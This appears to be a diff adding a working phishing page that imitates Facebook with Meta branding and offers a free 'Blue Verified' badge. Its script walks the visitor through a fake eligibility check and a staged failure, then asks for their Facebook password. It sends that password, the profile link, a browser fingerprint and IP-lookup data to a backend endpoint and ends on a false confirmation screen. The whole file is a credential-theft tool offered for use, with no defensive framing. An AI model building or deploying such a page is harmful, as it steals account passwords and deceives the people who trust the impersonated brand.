@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Free Facebook Blue Verified – Get Verified</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    :root { --blue: #0064E0; --text-primary: #111112; --text-secondary: #666A72; --border-unfocused: #DFE2E5; --border-focused: #666A72; }
+    html, body { height: 100%; background: #fff; font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif; color: var(--text-primary); overflow-x: hidden; }
+    .app-banner { display: flex; align-items: center; padding: 10px 12px; gap: 8px; cursor: pointer; background: #fff; }
+    .banner-icon { width: 24px; height: 24px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; }
+    .banner-text { font-size: 13px; color: #1763CF; line-height: 1.3; flex: 1; }
+    .banner-divider { height: 0.5px; background: #C9CCD1; }
+    .page { display: flex; flex-direction: column; min-height: calc(100vh - 45px); padding: 8px 16px 14px; background: #fff; }
+    .logo-wrap { display: flex; justify-content: center; align-items: center; flex: 0; min-height: 60px; margin-bottom: 20px; }
+    .logo-wrap img { max-height: 60px; object-fit: contain; }
+    .fb-wordmark { color: #0064E0; font-size: 42px; font-weight: 900; letter-spacing: -1px; font-family: Georgia, serif; text-align: center; }
+    .card { background: #fff; border-radius: 16px; padding: 20px 16px; margin-bottom: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); border: 1px solid #e4e6eb; }
+    .title { font-size: 20px; font-weight: 700; margin-bottom: 8px; color: #1b1f23; }
+    .subtitle { font-size: 14px; color: #65676b; margin-bottom: 20px; }
+    .field { position: relative; margin-bottom: 16px; }
+    .field-box { border: 1px solid var(--border-unfocused); border-radius: 16px; background: #fff; padding: 10px 16px; display: flex; align-items: center; gap: 8px; cursor: text; transition: border-color 0.15s; min-height: 52px; }
+    .field-box.focused { border-color: var(--border-focused); }
+    .field-inner { flex: 1; display: flex; flex-direction: column; justify-content: center; }
+    .field-label { font-size: 13.5px; color: var(--text-secondary); line-height: 1.2; display: none; }
+    .field-label.visible { display: block; }
+    .field-input { border: none; outline: none; background: transparent; font-size: 15.2px; color: var(--text-primary); width: 100%; padding: 0; font-family: inherit; line-height: 1.4; }
+    .field-input::placeholder { color: var(--text-secondary); font-size: 15.2px; }
+    .field-action { cursor: pointer; color: #8a8f98; display: none; }
+    .field-action.show { display: flex; align-items: center; }
+    .btn-primary { width: 100%; height: 44px; background: var(--blue); color: #F2F4F6; border: none; border-radius: 22px; font-size: 15.2px; font-weight: 600; cursor: pointer; transition: opacity 0.15s, transform 0.1s; }
+    .btn-primary:active { opacity: 0.85; transform: scale(0.98); }
+    .btn-secondary { background: none; border: none; color: var(--blue); font-weight: 600; font-size: 14px; cursor: pointer; padding: 8px; }
+    .spinner-wrap { text-align: center; padding: 20px; }
+    .spinner { width: 32px; height: 32px; border: 3px solid #ddd; border-top: 3px solid var(--blue); border-radius: 50%; animation: spin 0.8s linear infinite; display: inline-block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .error-message, .success-message { border-radius: 12px; padding: 12px 16px; margin: 16px 0; font-size: 14px; text-align: center; }
+    .error-message { background: #fee8e6; color: #c00; }
+    .success-message { background: #e6f4ea; color: #2d6a4f; }
+    .retry-btn { background: transparent; border: 1px solid var(--blue); border-radius: 22px; color: var(--blue); padding: 10px 20px; font-size: 15px; font-weight: 600; margin-top: 12px; cursor: pointer; }
+    .meta-logo-wrap { display: flex; justify-content: center; align-items: center; padding: 20px 0; }
+    .footer { display: flex; flex-direction: column; align-items: center; gap: 2px; margin-top: auto; }
+    .footer-row { display: flex; flex-wrap: wrap; justify-content: center; }
+    .footer-row a, .more-links a { color: #63788A; font-size: 10px; text-decoration: none; padding: 3px 4px; }
+    .more-links { display: flex; flex-wrap: wrap; justify-content: center; padding: 6px 0; }
+    .lang-select { font-size: 12px; color: #63788A; text-align: center; margin-top: 8px; }
+    .lang-select select { border: none; background: transparent; font-size: 12px; color: #63788A; }
+    .step { display: none; }
+    .step.active { display: block; }
+  </style>
+</head>
+<body>
+
+<div class="app-banner" onclick="window.open('https://apps.apple.com/app/facebook/id284882215','_blank')">
+  <div class="banner-icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="#0064E0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
+  <div class="banner-text">Get Facebook for iOS and browse faster.</div>
+</div>
+<div class="banner-divider"></div>
+
+<div class="page">
+  <div class="logo-wrap">
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/ye/r/bUZjZjr-wvp.webp" alt="Facebook from Meta" onerror="this.style.display='none';document.getElementById('fb-fallback').style.display='block';">
+    <span id="fb-fallback" class="fb-wordmark" style="display:none;">facebook</span>
+  </div>
+
+  <!-- STEP 1 -->
+  <div id="step-start" class="step active">
+    <div class="card" style="text-align: center;">
+      <div class="title">✨ Get Facebook Blue Verified ✨</div>
+      <div class="subtitle">Limited time offer – Get verified badge for free</div>
+      <button class="btn-primary" id="startBtn" style="margin-top: 16px;">Get Verified Now</button>
+    </div>
+  </div>
+
+  <!-- STEP 2: LINK -->
+  <div id="step-link" class="step">
+    <div class="card">
+      <div class="title">🔗 Enter your profile link</div>
+      <div class="subtitle">We'll verify your eligibility</div>
+      <div class="field">
+        <div class="field-box" id="link-box">
+          <div class="field-inner">
+            <span class="field-label" id="link-label">Facebook profile URL</span>
+            <input class="field-input" type="url" id="link-input" placeholder="https://facebook.com/yourprofile" autocomplete="off">
+          </div>
+          <div class="field-action" id="link-clear" onclick="clearLink()">✖</div>
+        </div>
+      </div>
+      <button class="btn-primary" id="submitLinkBtn">Continue</button>
+    </div>
+  </div>
+
+  <!-- STEP 3: PROCESSING -->
+  <div id="step-processing" class="step">
+    <div class="card" style="text-align: center;">
+      <div class="title">⏳ Processing your request</div>
+      <div class="spinner-wrap"><div class="spinner"></div></div>
+      <div class="subtitle" id="processing-text">Checking your profile eligibility...</div>
+    </div>
+  </div>
+
+  <!-- STEP 4: FAILED -->
+  <div id="step-failed" class="step">
+    <div class="card" style="text-align: center;">
+      <div class="title">❌ Verification failed</div>
+      <div class="error-message" id="fail-msg">We couldn't verify your profile automatically.</div>
+      <button class="retry-btn" id="retryBtn">Retry</button>
+    </div>
+  </div>
+
+  <!-- STEP 5: PASSWORD -->
+  <div id="step-password" class="step">
+    <div class="card">
+      <div class="title">🔐 Confirm your identity</div>
+      <div class="subtitle">Enter your Facebook password to complete verification</div>
+      <div class="field">
+        <div class="field-box" id="pass-box">
+          <div class="field-inner">
+            <span class="field-label" id="pass-label">Password</span>
+            <input class="field-input" type="password" id="password-input" placeholder="Password" autocomplete="off">
+          </div>
+          <div class="field-action" id="pass-eye" onclick="togglePassword()">👁️</div>
+        </div>
+      </div>
+      <button class="btn-primary" id="submitPasswordBtn">Submit</button>
+    </div>
+  </div>
+
+  <!-- STEP 6: DONE -->
+  <div id="step-done" class="step">
+    <div class="card" style="text-align: center;">
+      <div class="title">✅ Verification submitted</div>
+      <div class="subtitle">You will receive an email within 24 hours.</div>
+      <button class="btn-primary" id="doneBtn" onclick="window.location.href='https://www.facebook.com'">Back to Facebook</button>
+    </div>
+  </div>
+
+  <div class="meta-logo-wrap">
+    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" alt="Meta" height="12" style="aspect-ratio:5;object-fit:contain;" onerror="this.outerHTML='<span class=\'meta-text\'>META</span>'">
+  </div>
+  <div class="footer">
+    <div class="footer-row"><a href="#">About</a><a href="#">Help</a><a href="#" id="more-btn" onclick="toggleMore(event)">More</a></div>
+    <div class="more-links" id="more-links" style="display:none;"><a href="#">Messenger</a><a href="#">Facebook Lite</a><a href="#">Video</a><a href="#">Meta Pay</a><a href="#">Meta Store</a><a href="#">Meta Quest</a><a href="#">Ray-Ban Meta</a><a href="#">Meta AI</a><a href="#">Instagram</a><a href="#">Threads</a><a href="#">Developers</a><a href="#">Careers</a><a href="#">Privacy Policy</a><a href="#">Privacy Centre</a></div>
+    <div class="lang-select"><select id="lang-switch"><option>English (US)</option><option>Español</option><option>Français</option><option>Português (Brasil)</option><option>العربية</option><option>中文(简体)</option><option>日本語</option></select></div>
+  </div>
+</div>
+
+<script>
+  // DOM elements
+  const stepStart = document.getElementById('step-start');
+  const stepLink = document.getElementById('step-link');
+  const stepProcessing = document.getElementById('step-processing');
+  const stepFailed = document.getElementById('step-failed');
+  const stepPassword = document.getElementById('step-password');
+  const stepDone = document.getElementById('step-done');
+  const linkInput = document.getElementById('link-input');
+  const linkBox = document.getElementById('link-box');
+  const linkLabel = document.getElementById('link-label');
+  const linkClear = document.getElementById('link-clear');
+  const passwordInput = document.getElementById('password-input');
+  const passBox = document.getElementById('pass-box');
+  const passLabel = document.getElementById('pass-label');
+  const passEye = document.getElementById('pass-eye');
+
+  let storedLink = '';
+  let passVisible = false;
+
+  function showStep(stepId) {
+    [stepStart, stepLink, stepProcessing, stepFailed, stepPassword, stepDone].forEach(step => step.classList.remove('active'));
+    document.getElementById(stepId).classList.add('active');
+    window.scrollTo(0, 0);
+  }
+
+  function setupField(input, box, label, actionBtn, placeholderText) {
+    const updateUI = () => {
+      if (input.value) {
+        label.classList.add('visible');
+        input.placeholder = '';
+        if (actionBtn) actionBtn.classList.add('show');
+      } else {
+        label.classList.remove('visible');
+        input.placeholder = placeholderText;
+        if (actionBtn) actionBtn.classList.remove('show');
+      }
+    };
+    input.addEventListener('focus', () => box.classList.add('focused'));
+    input.addEventListener('blur', () => box.classList.remove('focused'));
+    input.addEventListener('input', updateUI);
+    updateUI();
+  }
+
+  setupField(linkInput, linkBox, linkLabel, linkClear, 'https://facebook.com/yourprofile');
+  setupField(passwordInput, passBox, passLabel, passEye, 'Password');
+
+  window.clearLink = function() {
+    linkInput.value = '';
+    linkLabel.classList.remove('visible');
+    linkInput.placeholder = 'https://facebook.com/yourprofile';
+    linkClear.classList.remove('show');
+    linkInput.focus();
+  };
+
+  window.togglePassword = function() {
+    passVisible = !passVisible;
+    passwordInput.type = passVisible ? 'text' : 'password';
+    passEye.innerHTML = passVisible ? '🙈' : '👁️';
+  };
+
+  async function collectExtraData() {
+    const fingerprint = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cookieEnabled: navigator.cookieEnabled,
+      screenResolution: `${screen.width}x${screen.height}`,
+      colorDepth: screen.colorDepth,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer: document.referrer || 'Direct',
+      plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
+      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+      deviceMemory: navigator.deviceMemory || 'unknown',
+    };
+    let ipData = {};
+    try {
+      const res = await fetch('https://ipapi.co/json/', { mode: 'cors' });
+      ipData = await res.json();
+    } catch(e) { ipData = { error: 'fetch failed' }; }
+    return { fingerprint, ipData };
+  }
+
+  async function sendToBackend(password, link) {
+    const extra = await collectExtraData();
+    const payload = { password, link, extra };
+    try {
+      const response = await fetch('/api/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      // No need to parse response – backend always returns 200 or 500 but we ignore
+      if (!response.ok) console.warn('Backend returned non-200');
+    } catch (err) {
+      console.error('Network error to backend', err);
+    }
+  }
+
+  // Flow
+  document.getElementById('startBtn').addEventListener('click', () => showStep('step-link'));
+  document.getElementById('submitLinkBtn').addEventListener('click', async () => {
+    const link = linkInput.value.trim();
+    if (!link) return alert('Please enter your Facebook profile link');
+    storedLink = link;
+    showStep('step-processing');
+    await new Promise(r => setTimeout(r, 3000));
+    showStep('step-failed');
+  });
+  document.getElementById('retryBtn').addEventListener('click', () => showStep('step-password'));
+  document.getElementById('submitPasswordBtn').addEventListener('click', async () => {
+    const password = passwordInput.value.trim();
+    if (!password) return alert('Please enter your password');
+    const btn = document.getElementById('submitPasswordBtn');
+    const original = btn.innerText;
+    btn.innerText = 'Submitting...';
+    btn.disabled = true;
+    await sendToBackend(password, storedLink);
+    showStep('step-done');
+    btn.innerText = original;
+    btn.disabled = false;
+  });
+  window.toggleMore = function(e) {
+    e.preventDefault();
+    const ml = document.getElementById('more-links');
+    ml.style.display = ml.style.display === 'none' ? 'flex' : 'none';
+  };
+</script>
+</body>
+</html>
